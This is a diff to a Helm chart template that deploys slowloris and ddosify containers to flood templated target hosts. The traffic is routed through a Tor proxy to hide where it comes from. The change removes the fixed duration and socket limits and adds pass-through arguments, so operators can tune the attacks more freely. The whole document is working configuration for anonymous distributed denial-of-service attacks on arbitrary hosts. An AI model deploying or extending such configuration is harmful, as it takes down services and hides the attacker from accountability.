@@ -33,7 +33,7 @@ spec:
           imagePullPolicy: {{ $.Values.slowloris.image.pullPolicy }}
           args:
             - |
-              --useproxy --proxy-host {{ $.Values.tor.host }} --proxy-port {{ $.Values.tor.socksPort }} {{ if $target.slowloris.https }}--https{{ end }} -ua -s 5000 --port {{ $target.port | default "443" }} {{ $target.host }}
+              --useproxy --proxy-host {{ $.Values.tor.host }} --proxy-port {{ $.Values.tor.socksPort }} {{ if $target.slowloris.https }}--https{{ end }} -ua --port {{ $target.port | default "443" }} {{ $target.slowloris.extraArgs | default "" }} {{ $target.host }}
           resources:
             {{- toYaml $target.slowloris.resources | nindent 12 }}
         {{- end }}
@@ -45,7 +45,7 @@ spec:
             - '/bin/sh'
             - '-c'
             - |
-              ddosify -d 3600 -P http://{{ $.Values.tor.host }}:{{ $.Values.tor.proxyPort }} -p {{ $target.ddosify.protocol | default "HTTPS" }} -t {{ $target.host }}
+              ddosify -P http://{{ $.Values.tor.host }}:{{ $.Values.tor.proxyPort }} -p {{ $target.ddosify.protocol | default "HTTPS" }} {{ $target.ddosify.extraArgs | default "" }} -t {{ $target.host }}
           resources:
             {{- toYaml $target.ddosify.resources | nindent 12 }}
         {{- end }}
